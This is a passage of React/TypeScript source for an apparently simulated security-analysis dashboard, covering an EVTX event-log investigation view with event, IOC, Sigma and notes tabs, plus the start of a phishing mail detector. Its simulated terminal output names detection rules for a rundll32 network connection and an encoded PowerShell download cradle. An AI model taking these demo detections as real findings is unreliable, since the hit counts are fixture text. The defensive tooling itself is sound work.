          terminalOutput={`[11:50:01] Parsing EVTX chunks... 24,891 records extracted\n[11:50:02] Building SQLite FTS5 inverted index... OK (380ms)\n[11:50:03] Evaluating Sigma ruleset... 5 rules matched (74 total hits)\n  CRITICAL: SIG-001 Suspicious Rundll32 Network Connection (47 hits)\n  CRITICAL: SIG-003 Malicious PowerShell EncodedCommand Cradle (4 hits)`}
          ctaLabel="Open Event Investigation →"
          onStart={() => {
            setMainTab('investigation');
            setSubTab('events');
          }}
        />
        <Modal
          open={uploadModalOpen}
          title="📋 Upload EVTX Log Files"
          subtitle="Ingest single or multiple Windows Event Log (.evtx) files for FTS5 indexing & Sigma hunting"
          onClose={() => setUploadModalOpen(false)}
        >
          {renderUploadModal()}
        </Modal>
      </>
    );
  }

  function renderUploadModal() {
    return (
      <div className="space-y-4 text-xs">
        <div className="p-6 rounded-xl border-2 border-dashed text-center space-y-2" style={{ borderColor: 'var(--color-border-focus)', backgroundColor: 'var(--color-canvas)' }}>
          <div className="text-2xl">📋</div>
          <div className="text-sm font-semibold">Select `.evtx` files or forensic triage folder</div>
          <div style={{ color: 'var(--color-text-secondary)' }}>Accepted: `.evtx` Windows Event Logs (Security, Sysmon, PowerShell, System)</div>
          <input
            type="text"
            value={evtxName}
            onChange={(e) => setEvtxName(e.target.value)}
            className="w-full max-w-sm mx-auto mt-2 px-3 py-1.5 rounded border sc-mono text-center"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          />
        </div>

        {ingesting && (
          <div className="p-4 rounded-lg border space-y-2" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}>
            <div className="flex items-center justify-between font-bold">
              <span>Stage: {['1/3 Parsing EVTX Binary Chunks', '2/3 Running Sigma & IOC Extractors', '3/3 Building SQLite FTS5 Index'][ingestStep]}</span>
              <span className="sc-mono text-cyan-400">{ingestTicker.toLocaleString()} events processed...</span>
            </div>
            <div className="h-2 rounded-full overflow-hidden" style={{ backgroundColor: 'var(--color-canvas)' }}>
              <div className="h-full sc-accent-bg sc-candy-stripe" style={{ width: `${((ingestStep + 1) / 3) * 100}%` }} />
            </div>
          </div>
        )}

        <div className="flex items-center justify-end gap-2 pt-2">
          <button
            type="button"
            onClick={() => setUploadModalOpen(false)}
            className="px-4 py-1.5 rounded-lg border cursor-pointer"
            style={{ borderColor: 'var(--color-border)' }}
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={runEvtxIngestion}
            disabled={ingesting || userRole === 'Viewer'}
            className="px-4 py-1.5 rounded-lg font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            Start Ingestion →
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-4 max-w-7xl mx-auto pb-16">
      {/* Header Contextual Bar */}
      <div className="rounded-xl p-3.5 sc-surface flex flex-wrap items-center justify-between gap-3">
        <div className="flex flex-wrap items-center gap-2">
          <span className="text-xs font-semibold" style={{ color: 'var(--color-text-secondary)' }}>
            Investigation:
          </span>
          <select
            value={activeInv.id}
            onChange={(e) => setActiveInvId(e.target.value)}
            className="px-3 py-1.5 rounded-lg text-xs font-semibold border"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
          >
            {investigations.map((inv) => (
              <option key={inv.id} value={inv.id}>
                {inv.name} ({inv.eventCount.toLocaleString()} events · {inv.timestamp})
              </option>
            ))}
          </select>
        </div>

        <div className="flex flex-wrap items-center gap-2">
          <button
            type="button"
            onClick={() => setUploadModalOpen(true)}
            disabled={userRole === 'Viewer'}
            className="px-3.5 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            + Upload EVTX
          </button>
          <button
            type="button"
            onClick={() => {
              downloadFileBlob(`${activeInv.id}-report.html`, `<html><body><h1>EVTX Investigation Report: ${activeInv.name}</h1><p>Events Indexed: ${activeInv.eventCount}</p></body></html>`, 'text/html');
              onAddToast({ type: 'success', title: 'Standalone HTML Report Downloaded', description: `${activeInv.name} exported.` });
            }}
            className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
            style={{ borderColor: 'var(--color-border)' }}
          >
            ⬇ Download Report
          </button>
        </div>
      </div>

      {/* 10.4 Sub-Tab: Events */}
      {subTab === 'events' && (
        <div className="space-y-4">
          {/* Collapsible Sticky Filter Card */}
          <div className="rounded-xl p-4 sc-surface space-y-3">
            <div className="flex items-center justify-between">
              <button
                type="button"
                onClick={() => setFilterExpanded(!filterExpanded)}
                className="text-xs font-bold uppercase tracking-wider flex items-center gap-2 cursor-pointer"
              >
                <span>{filterExpanded ? '▼' : '▶'} SQLite FTS5 Multi-Dimension Filter Matrix</span>
                <span className="sc-mono text-[11px] px-2 py-0.5 rounded bg-cyan-500/15 text-cyan-300">
                  Showing {filteredEvents.length} of {activeInv.eventCount.toLocaleString()} indexed
                </span>
              </button>
              <div className="flex items-center gap-2 text-xs">
                <label className="inline-flex items-center gap-1.5 cursor-pointer">
                  <input type="checkbox" checked={bookmarkedOnly} onChange={(e) => setBookmarkedOnly(e.target.checked)} />
                  <span>⭐ Bookmarked Only</span>
                </label>
                <button
                  type="button"
                  onClick={() => setSortOrder(sortOrder === 'newest' ? 'oldest' : 'newest')}
                  className="px-2.5 py-1 rounded border text-[11px] cursor-pointer"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  Sort: {sortOrder === 'newest' ? 'Newest First ↓' : 'Oldest First ↑'}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setFtsQuery('');
                    setEventIdFilter('');
                    setChannelFilter('All');
                    setProviderFilter('All');
                    setProcessFilter('');
                    setCmdFilter('');
                    setUserFilter('');
                    setHostFilter('');
                    setBookmarkedOnly(false);
                  }}
                  className="text-xs underline cursor-pointer"
                  style={{ color: 'var(--accent-from)' }}
                >
                  Clear All
                </button>
              </div>
            </div>

            {filterExpanded && (
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5 pt-1 text-xs">
                <input
                  type="text"
                  value={ftsQuery}
                  onChange={(e) => setFtsQuery(e.target.value)}
                  placeholder="FTS5 Full-Text Search (IP, command, hash)..."
                  className="sm:col-span-2 px-3 py-1.5 rounded border sc-mono"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
                <input
                  type="text"
                  value={eventIdFilter}
                  onChange={(e) => setEventIdFilter(e.target.value)}
                  placeholder="Event ID (e.g. 3, 4104, 4688)"
                  className="px-3 py-1.5 rounded border sc-mono"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
                <select
                  value={channelFilter}
                  onChange={(e) => setChannelFilter(e.target.value)}
                  className="px-3 py-1.5 rounded border"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                >
                  <option value="All">All Channels</option>
                  {activeInv.channels.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
                <input
                  type="text"
                  value={processFilter}
                  onChange={(e) => setProcessFilter(e.target.value)}
                  placeholder="Process name (e.g. rundll32.exe)"
                  className="px-3 py-1.5 rounded border sc-mono"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
                <input
                  type="text"
                  value={cmdFilter}
                  onChange={(e) => setCmdFilter(e.target.value)}
                  placeholder="Command line contains..."
                  className="px-3 py-1.5 rounded border sc-mono"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
                <input
                  type="text"
                  value={userFilter}
                  onChange={(e) => setUserFilter(e.target.value)}
                  placeholder="User (e.g. j.miller)"
                  className="px-3 py-1.5 rounded border sc-mono"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
                <input
                  type="text"
                  value={hostFilter}
                  onChange={(e) => setHostFilter(e.target.value)}
                  placeholder="Hostname (e.g. WKS-FINANCE04)"
                  className="px-3 py-1.5 rounded border sc-mono"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
              </div>
            )}

            {/* Active Filter Chips */}
            {(ftsQuery || eventIdFilter || channelFilter !== 'All' || processFilter || cmdFilter || userFilter || hostFilter || bookmarkedOnly) && (
              <div className="flex flex-wrap items-center gap-1.5 pt-1">
                {ftsQuery && (
                  <span className="px-2.5 py-0.5 rounded-full text-[11px] sc-mono bg-sky-500/20 text-sky-300 flex items-center gap-1.5">
                    FTS: "{ftsQuery}"
                    <button type="button" onClick={() => setFtsQuery('')} className="cursor-pointer font-bold">
                      ×
                    </button>
                  </span>
                )}
                {eventIdFilter && (
                  <span className="px-2.5 py-0.5 rounded-full text-[11px] sc-mono bg-sky-500/20 text-sky-300 flex items-center gap-1.5">
                    EventID: {eventIdFilter}
                    <button type="button" onClick={() => setEventIdFilter('')} className="cursor-pointer font-bold">
                      ×
                    </button>
                  </span>
                )}
                {processFilter && (
                  <span className="px-2.5 py-0.5 rounded-full text-[11px] sc-mono bg-sky-500/20 text-sky-300 flex items-center gap-1.5">
                    Process: {processFilter}
                    <button type="button" onClick={() => setProcessFilter('')} className="cursor-pointer font-bold">
                      ×
                    </button>
                  </span>
                )}
              </div>
            )}
          </div>

          {/* Events Table */}
          <div className="rounded-xl sc-surface overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs border-collapse">
                <thead>
                  <tr className="border-b" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                    <th className="py-2.5 px-3 w-10">⭐</th>
                    <th className="py-2.5 px-3 w-16">#</th>
                    <th className="py-2.5 px-3">Timestamp (UTC)</th>
                    <th className="py-2.5 px-3">Event ID</th>
                    <th className="py-2.5 px-3">Computer</th>
                    <th className="py-2.5 px-3">User</th>
                    <th className="py-2.5 px-3">Summary & Command Line</th>
                  </tr>
                </thead>
                <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                  {filteredEvents.map((ev) => {
                    const isSelected = selectedEventId === ev.id;
                    return (
                      <tr
                        key={ev.id}
                        onClick={() => setSelectedEventId(ev.id)}
                        className="cursor-pointer transition"
                        style={{
                          backgroundColor: isSelected ? 'var(--color-surface-hover)' : 'transparent'
                        }}
                      >
                        <td
                          className="py-2.5 px-3"
                          onClick={(e) => {
                            e.stopPropagation();
                            toggleBookmark(ev.id);
                          }}
                        >
                          <span className="text-sm">{ev.bookmarked ? '⭐' : '☆'}</span>
                        </td>
                        <td className="py-2.5 px-3 sc-mono" style={{ color: 'var(--color-text-tertiary)' }}>
                          {ev.id}
                        </td>
                        <td className="py-2.5 px-3 sc-mono whitespace-nowrap" title={ev.relTime}>
                          {ev.timestamp}
                        </td>
                        <td className="py-2.5 px-3">
                          <VerdictBadge
                            verdict={ev.level === 'Critical' ? 'malicious' : ev.level === 'High' || ev.level === 'Warning' ? 'suspicious' : 'info'}
                            label={`EID ${ev.eventId}`}
                          />
                        </td>
                        <td className="py-2.5 px-3 sc-mono">{ev.computer}</td>
                        <td className="py-2.5 px-3 sc-mono">{ev.user}</td>
                        <td className="py-2.5 px-3 max-w-xl truncate">{ev.summary}</td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>

          {/* Event Detail Drawer (Bottom Slide-Up Panel) */}
          {selectedEvent && (
            <div
              className="rounded-xl sc-surface-raised border-2 shadow-2xl p-4 space-y-3"
              style={{ borderColor: 'var(--color-border-focus)', minHeight: drawerHeight }}
            >
              <div className="flex flex-wrap items-center justify-between gap-2 pb-2 border-b" style={{ borderColor: 'var(--color-border)' }}>
                <div className="flex flex-wrap items-center gap-2 text-xs">
                  <VerdictBadge verdict={selectedEvent.level === 'Critical' ? 'malicious' : 'suspicious'} label={`Event ID ${selectedEvent.eventId} (${selectedEvent.level})`} />
                  <span className="sc-mono font-bold">{selectedEvent.computer}</span>
                  <span style={{ color: 'var(--color-text-secondary)' }}>· User: {selectedEvent.user}</span>
                  <span className="sc-mono" style={{ color: 'var(--color-text-tertiary)' }}>
                    · {selectedEvent.timestamp}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    type="button"
                    onClick={() => setDrawerHeight(drawerHeight === 320 ? 460 : 320)}
                    className="px-2 py-1 rounded text-[11px] border cursor-pointer"
                    style={{ borderColor: 'var(--color-border)' }}
                  >
                    {drawerHeight === 320 ? '⤢ Expand Drawer' : '⤡ Compact Drawer'}
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      copyTextToClipboard(JSON.stringify(selectedEvent, null, 2));
                      onAddToast({ type: 'info', title: 'Copied Full Event JSON', description: `Record #${selectedEvent.id} copied.` });
                    }}
                    className="px-2.5 py-1 rounded text-[11px] font-semibold border cursor-pointer"
                    style={{ borderColor: 'var(--color-border)' }}
                  >
                    Copy JSON
                  </button>
                  <button
                    type="button"
                    onClick={() => setSelectedEventId(null)}
                    className="px-2.5 py-1 rounded text-xs font-bold border cursor-pointer"
                    style={{ borderColor: 'var(--color-border)' }}
                  >
                    ✕ Close
                  </button>
                </div>
              </div>

              {/* Extracted IOCs & Sigma Matches Chips */}
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <span className="font-semibold" style={{ color: 'var(--color-text-secondary)' }}>
                  Extracted IOCs:
                </span>
                {selectedEvent.iocs.map((iocVal) => (
                  <button
                    key={iocVal}
                    type="button"
                    onClick={() =>
                      onPivot({
                        fromTool: 'events',
                        fromLabel: `Event #${selectedEvent.id} (EID ${selectedEvent.eventId})`,
                        fromMainTab: 'investigation',
                        fromSubTab: 'events',
                        toTool: 'ioc',
                        toMainTab: 'lookup',
                        toSubTab: 'lookup',
                        indicatorValue: iocVal,
                        indicatorType: 'EVTX Observable'
                      })
                    }
                    className="px-2.5 py-0.5 rounded-full sc-mono text-[11px] bg-amber-500/20 text-amber-300 border border-amber-500/40 cursor-pointer"
                  >
                    🔍 {iocVal} →
                  </button>
                ))}
                {selectedEvent.sigmaMatches.map((sigTitle) => (
                  <button
                    key={sigTitle}
                    type="button"
                    onClick={() => setSubTab('sigma')}
                    className="px-2.5 py-0.5 rounded-full sc-mono text-[11px] bg-red-500/20 text-red-300 border border-red-500/40 cursor-pointer"
                  >
                    ⚡ {sigTitle}
                  </button>
                ))}
              </div>

              {/* Raw Event Data Tabs: Header | System | EventData | UserData */}
              <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
                <div className="flex items-center gap-1.5">
                  {(['Header', 'System', 'EventData', 'UserData'] as const).map((tabName) => (
                    <button
                      key={tabName}
                      type="button"
                      onClick={() => setDrawerRawTab(tabName)}
                      className={`px-3 py-1 rounded text-xs font-semibold cursor-pointer ${
                        drawerRawTab === tabName ? 'sc-accent-bg text-white' : 'border'
                      }`}
                      style={drawerRawTab === tabName ? {} : { borderColor: 'var(--color-border)' }}
                    >
                      {tabName}
                    </button>
                  ))}
                </div>
                <input
                  type="text"
                  value={drawerSearch}
                  onChange={(e) => setDrawerSearch(e.target.value)}
                  placeholder={`Search ${drawerRawTab} fields...`}
                  className="px-2.5 py-1 rounded text-xs sc-mono border"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                {Object.entries(selectedEvent.raw[drawerRawTab] || {})
                  .filter(([k, v]) => `${k} ${v}`.toLowerCase().includes(drawerSearch.toLowerCase()))
                  .map(([k, v]) => (
                    <CopyKV
                      key={k}
                      label={k}
                      value={String(v)}
                      onCopy={(val) => {
                        copyTextToClipboard(val);
                        onAddToast({ type: 'info', title: `Copied ${k}`, description: val });
                      }}
                    />
                  ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* 10.5 Sub-Tab: IOCs */}
      {subTab === 'iocs' && (
        <div className="rounded-xl p-5 sc-surface space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div className="flex flex-wrap items-center gap-1.5">
              {['All', 'IPs', 'Domains', 'Hashes', 'URLs', 'File Paths', 'Registry Keys', 'Processes'].map((t) => (
                <button
                  key={t}
                  type="button"
                  onClick={() => setIocTypeFilter(t)}
                  className={`px-3 py-1 rounded-full text-xs font-semibold cursor-pointer ${
                    iocTypeFilter === t ? 'sc-accent-bg text-white' : 'border'
                  }`}
                  style={iocTypeFilter === t ? {} : { borderColor: 'var(--color-border)' }}
                >
                  {t}
                </button>
              ))}
            </div>
            <input
              type="text"
              value={iocSearch}
              onChange={(e) => setIocSearch(e.target.value)}
              placeholder="Search extracted EVTX IOCs..."
              className="px-3 py-1.5 rounded-lg text-xs sc-mono border"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                  <th className="py-2.5 px-3">Type</th>
                  <th className="py-2.5 px-3">Observable Value</th>
                  <th className="py-2.5 px-3">Source EVTX Field</th>
                  <th className="py-2.5 px-3">Event Count (Filter Events)</th>
                  <th className="py-2.5 px-3 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                {activeInv.iocs
                  .filter((i) => (iocTypeFilter === 'All' ? true : i.type === iocTypeFilter))
                  .filter((i) => i.value.toLowerCase().includes(iocSearch.toLowerCase()))
                  .map((item, idx) => (
                    <tr key={idx}>
                      <td className="py-2.5 px-3">
                        <VerdictBadge verdict={item.verdict} label={item.type} />
                      </td>
                      <td className="py-2.5 px-3 sc-mono font-bold break-all">{item.value}</td>
                      <td className="py-2.5 px-3 sc-mono" style={{ color: 'var(--color-text-secondary)' }}>
                        {item.sourceField}
                      </td>
                      <td className="py-2.5 px-3">
                        <button
                          type="button"
                          onClick={() => {
                            setFtsQuery(item.value);
                            setSubTab('events');
                          }}
                          className="px-2.5 py-0.5 rounded-full sc-mono font-bold bg-sky-500/20 text-sky-300 hover:underline cursor-pointer"
                        >
                          {item.eventCount} events →
                        </button>
                      </td>
                      <td className="py-2.5 px-3 text-right">
                        <div className="inline-flex items-center gap-1.5">
                          <button
                            type="button"
                            onClick={() =>
                              onPinIoc({
                                value: item.value,
                                type: 'ip',
                                sourceTool: 'events',
                                sourceContext: activeInv.name,
                                verdict: item.verdict
                              })
                            }
                            className="px-2 py-1 rounded border text-[11px] cursor-pointer"
                            style={{ borderColor: 'var(--color-border)' }}
                          >
                            📌 Pin
                          </button>
                          <button
                            type="button"
                            onClick={() =>
                              onPivot({
                                fromTool: 'events',
                                fromLabel: `EVTX Investigation: ${activeInv.name}`,
                                fromMainTab: 'investigation',
                                fromSubTab: 'iocs',
                                toTool: 'ioc',
                                toMainTab: 'lookup',
                                toSubTab: 'lookup',
                                indicatorValue: item.value,
                                indicatorType: item.type
                              })
                            }
                            className="px-3 py-1 rounded text-[11px] font-semibold text-white sc-accent-bg cursor-pointer"
                          >
                            Enrich in IOC Lookup →
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* 10.6 Sub-Tab: Sigma */}
      {subTab === 'sigma' && (
        <div className="rounded-xl p-5 sc-surface space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div className="flex items-center gap-1.5">
              {['All', 'critical', 'high', 'medium', 'low'].map((sev) => (
                <button
                  key={sev}
                  type="button"
                  onClick={() => setSigmaSeverityFilter(sev)}
                  className={`px-3 py-1 rounded-full text-xs font-semibold uppercase cursor-pointer ${
                    sigmaSeverityFilter === sev ? 'sc-accent-bg text-white' : 'border'
                  }`}
                  style={sigmaSeverityFilter === sev ? {} : { borderColor: 'var(--color-border)' }}
                >
                  {sev}
                </button>
              ))}
            </div>
            <input
              type="text"
              value={sigmaSearch}
              onChange={(e) => setSigmaSearch(e.target.value)}
              placeholder="Search Sigma rule title or MITRE ID..."
              className="px-3 py-1.5 rounded-lg text-xs sc-mono border"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                  <th className="py-2.5 px-3">Severity</th>
                  <th className="py-2.5 px-3">Rule ID & Title</th>
                  <th className="py-2.5 px-3">Matches</th>
                  <th className="py-2.5 px-3">MITRE ATT&CK</th>
                  <th className="py-2.5 px-3 text-right">Pivot</th>
                </tr>
              </thead>
              <tbody className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
                {activeInv.sigmaRules
                  .filter((r) => (sigmaSeverityFilter === 'All' ? true : r.severity === sigmaSeverityFilter))
                  .filter((r) => `${r.title} ${r.id} ${r.mitre.join(' ')}`.toLowerCase().includes(sigmaSearch.toLowerCase()))
                  .map((rule) => (
                    <tr
                      key={rule.id}
                      onClick={() => setSelectedSigmaRule(rule)}
                      className="cursor-pointer hover:opacity-90"
                    >
                      <td className="py-2.5 px-3">
                        <VerdictBadge verdict={rule.severity} label={rule.severity} />
                      </td>
                      <td className="py-2.5 px-3">
                        <div className="font-bold">{rule.title}</div>
                        <div className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                          {rule.description}
                        </div>
                      </td>
                      <td className="py-2.5 px-3 sc-mono font-bold">{rule.matchCount} hits</td>
                      <td className="py-2.5 px-3 sc-mono">{rule.mitre.join(', ')}</td>
                      <td
                        className="py-2.5 px-3 text-right"
                        onClick={(e) => {
                          e.stopPropagation();
                          onPivot({
                            fromTool: 'events',
                            fromLabel: `Sigma Detection: ${rule.id}`,
                            fromMainTab: 'investigation',
                            fromSubTab: 'sigma',
                            toTool: 'ruleforge',
                            toMainTab: 'workshop',
                            toSubTab: 'author',
                            indicatorValue: rule.yaml,
                            indicatorType: 'Sigma Rule'
                          });
                        }}
                      >
                        <button type="button" className="px-3 py-1 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer">
                          View in RuleForge →
                        </button>
                      </td>
                    </tr>
                  ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Sigma Rule Detail Modal */}
      <Modal
        open={!!selectedSigmaRule}
        title={selectedSigmaRule ? `${selectedSigmaRule.id}: ${selectedSigmaRule.title}` : 'Sigma Rule Detail'}
        subtitle="Matched EVTX telemetry and canonical Sigma YAML definition"
        onClose={() => setSelectedSigmaRule(null)}
        maxWidth="max-w-2xl"
      >
        {selectedSigmaRule && (
          <div className="space-y-4 text-xs">
            <p style={{ color: 'var(--color-text-secondary)' }}>{selectedSigmaRule.description}</p>
            <pre className="p-3.5 rounded-lg sc-mono text-[11px] overflow-x-auto" style={{ backgroundColor: 'var(--color-canvas)' }}>
              {selectedSigmaRule.yaml}
            </pre>
            <div className="flex items-center justify-end gap-2">
              <button
                type="button"
                onClick={() => {
                  const r = selectedSigmaRule;
                  setSelectedSigmaRule(null);
                  onPivot({
                    fromTool: 'events',
                    fromLabel: `Sigma Rule: ${r.id}`,
                    fromMainTab: 'investigation',
                    fromSubTab: 'sigma',
                    toTool: 'ruleforge',
                    toMainTab: 'workshop',
                    toSubTab: 'author',
                    indicatorValue: r.yaml,
                    indicatorType: 'Sigma Rule'
                  });
                }}
                className="px-4 py-1.5 rounded-lg font-semibold text-white sc-accent-bg cursor-pointer"
              >
                Open & Translate in RuleForge Workshop →
              </button>
            </div>
          </div>
        )}
      </Modal>

      {/* 10.7 Sub-Tab: Notes (Split-Pane Markdown Editor + Live Preview) */}
      {subTab === 'notes' && (
        <div className="rounded-xl p-5 sc-surface space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div className="flex items-center gap-1.5 text-xs">
              {[
                { label: 'B', insert: '**bold** ' },
                { label: 'I', insert: '*italic* ' },
                { label: 'H2', insert: '\n## Section Heading\n' },
                { label: '• List', insert: '\n- Finding item' },
                { label: '</> Code', insert: '`indicator` ' },
                { label: '🔗 Link', insert: '[MITRE ATT&CK](https://attack.mitre.org) ' }
              ].map((btn) => (
                <button
                  key={btn.label}
                  type="button"
                  onClick={() => handleNotesChange(notesText + btn.insert)}
                  className="px-2.5 py-1 rounded border font-semibold cursor-pointer"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  {btn.label}
                </button>
              ))}
            </div>
            <span className="sc-mono text-xs" style={{ color: saveState === 'saved' ? 'var(--color-clean)' : 'var(--color-suspicious)' }}>
              {saveState === 'saved' ? 'Saved ✓ (Auto-save active)' : 'Saving changes...'}
            </span>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            <textarea
              rows={14}
              value={notesText}
              onChange={(e) => handleNotesChange(e.target.value)}
              className="w-full p-3.5 rounded-xl text-xs sc-mono border leading-relaxed"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
            <div
              className="p-4 rounded-xl border text-xs space-y-2 overflow-y-auto max-h-96 leading-relaxed"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
            >
              <div className="text-[10px] font-bold uppercase tracking-wider pb-1 border-b" style={{ borderColor: 'var(--color-border-subtle)', color: 'var(--color-text-tertiary)' }}>
                Live Markdown Preview
              </div>
              {notesText.split('\n').map((line, i) => {
                if (line.startsWith('# ')) return <h3 key={i} className="text-base font-bold pt-1">{line.slice(2)}</h3>;
                if (line.startsWith('## ')) return <h4 key={i} className="text-sm font-bold pt-1" style={{ color: 'var(--accent-from)' }}>{line.slice(3)}</h4>;
                if (line.startsWith('- ')) return <div key={i} className="pl-3">• {line.slice(2)}</div>;
                return <p key={i}>{line}</p>;
              })}
            </div>
          </div>
        </div>
      )}

      <Modal
        open={uploadModalOpen}
        title="📋 Upload EVTX Log Files"
        subtitle="Ingest single or multiple Windows Event Log (.evtx) files for FTS5 indexing & Sigma hunting"
        onClose={() => setUploadModalOpen(false)}
      >
        {renderUploadModal()}
      </Modal>
    </div>
  );
};

// ============================================================================
// 12. TOOL 4: PHISHING MAIL DETECTOR (Section 11 — Bug #1 Fixed: subTab === "dashboard")
// ============================================================================
const PHISHING_11_STAGES = [
  '1. Upload (.eml stream)',
  '2. Parse MIME Structure',
  '3. Authentication (SPF/DKIM/DMARC/ARC)',
  '4. Sender & Reply-To Divergence Analysis',
  '5. Defanged URL & Redirect Extraction',
  '6. Attachment Magic-Byte & Hash Dissection',
  '7. VirusTotal Domain/Hash Enrichment',
  '8. urlscan.io DOM & Screenshot Analysis',
  '9. Composite Risk Scoring (0–10)',
  '10. MITRE ATT&CK Technique Mapping',
  '11. Complete'
];

export const PhishingTool: React.FC<{
  mainTab: string;
  subTab: string;
  setMainTab: (t: string) => void;
  setSubTab: (s: string) => void;
  uploadModalOpen: boolean;
  setUploadModalOpen: (v: boolean) => void;
  onPivot: (req: Omit<PivotRequest, 'id' | 'timestamp'>) => void;
  onPinIoc: (item: Omit<IOCClipboardItem, 'id' | 'addedAt'>) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
  userRole: UserRole;
}> = ({
  mainTab,
  subTab,
  setMainTab,
  setSubTab,
  uploadModalOpen,
  setUploadModalOpen,
  onPivot,
  onPinIoc,
  onAddToast,
  userRole
}) => {
  const [scans, setScans] = useState(MORE_FIXTURES.phishingScans);
  const [activeScanId, setActiveScanId] = useState(MORE_FIXTURES.phishingScans[0].id);
  const activeScan = useMemo(() => scans.find((s) => s.id === activeScanId) || scans[0], [scans, activeScanId]);

  const [emlFilename, setEmlFilename] = useState('Urgent_Wire_Remittance_Q3.eml');
  const [enableExternalEnrich, setEnableExternalEnrich] = useState(true);
  const [resolveRedirects, setResolveRedirects] = useState(true);
  const [runningPipeline, setRunningPipeline] = useState(false);
  const [pipelineStep, setPipelineStep] = useState(0);

  const [observableFilter, setObservableFilter] = useState('');
  const [previewMode, setPreviewMode] = useState<'html' | 'text' | 'headers'>('html');
  const [headerSearch, setHeaderSearch] = useState('');

  // Bug #1 Fix: Always route completed scan and dropdown selection to subTab "dashboard"
  const runPhishingAnalysis = () => {
    setUploadModalOpen(false);
    setMainTab('analysis');
    setRunningPipeline(true);
    setPipelineStep(0);

    let step = 0;
    const interval = setInterval(() => {
      step += 2;
      if (step >= 11) {
        clearInterval(interval);
        setRunningPipeline(false);
        setSubTab('dashboard'); // Strictly "dashboard", never "overview" or "summary"
        onAddToast({
          type: 'success',
          title: `Phishing Analysis Complete: ${emlFilename}`,
          description: `Verdict: ${activeScan.verdictLabel} (${activeScan.score}/10)`
        });
      } else {
        setPipelineStep(step);
      }
    }, 240);
  };

  if (mainTab === 'overview') {
    return (
      <>
        <ToolOverviewTemplate
          tool={TOOLS_REGISTRY.phishing}
          stats={[
            { label: 'Forensic Pipeline', value: '11 Automated Stages' },
            { label: 'Threat Heuristics', value: '~40 Weighted Signals' },
            { label: 'Auth Verification', value: 'SPF · DKIM · DMARC · ARC' },
            { label: 'HTML Mail Rendering', value: 'Zero-Script Sandboxed' }
          ]}
          doesList={[
            'Parses raw RFC 822 `.eml` messages across an 11-stage forensic pipeline with ~40 spoofing, lookalike, and payload signals.',
            'Visualizes hop-by-hop MTA Received headers, transit delays, and unencrypted SMTP relays.',
            'Constructs an Identity Mismatch Matrix comparing From, Reply-To, Return-Path, Sender, and Display Name.',
